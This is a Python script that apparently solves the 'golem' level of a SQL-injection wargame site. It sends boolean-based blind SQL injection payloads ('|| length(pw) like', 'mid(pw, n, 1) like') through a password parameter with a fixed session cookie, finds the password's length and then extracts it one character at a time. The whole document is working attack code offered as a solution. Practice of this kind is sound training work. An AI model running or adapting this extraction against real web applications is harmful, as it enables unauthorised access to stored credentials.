import requests

url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
cookie = {'PHPSESSID': 'ovbfdu14h0vaeamskdlr10nttu'}

for i in range(20):
  param = {'pw': f"' || length(pw) like {i}#"}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'pw': f"' || mid(pw, {str(len)}, 1) like '{chr(pw)}'#"}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password.lower())
